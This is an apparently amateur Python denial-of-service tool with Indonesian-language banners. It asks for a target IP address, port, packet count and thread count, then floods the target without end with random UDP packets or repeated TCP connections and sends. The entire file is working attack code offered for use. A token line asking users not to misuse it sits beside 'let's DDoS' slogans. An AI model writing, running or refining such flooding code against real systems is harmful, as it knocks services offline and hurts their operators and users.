#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

print("~~~ DDOS TOOLS R4P1P G4NZ ~~~")
print("~~~ KALO KENA DDOS JANGAN MARAH ~~~")
print("~~~ Script ini dibuat hanya untuk BLOOD OF DESTRUCTION. ~~~")
print("~~~ JANGAN MENYALAHGUNAKAN TOOLS DDOS UNTUK KESENANGAN TERSENDIRI~~~")
print("~~~ SKUD KITA DDOS . ~~~")
ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" AYANG PAKET!!!")
		except:
			print("[!] GAGALTOD!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KIMOCHI KIMOCHI!!!")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
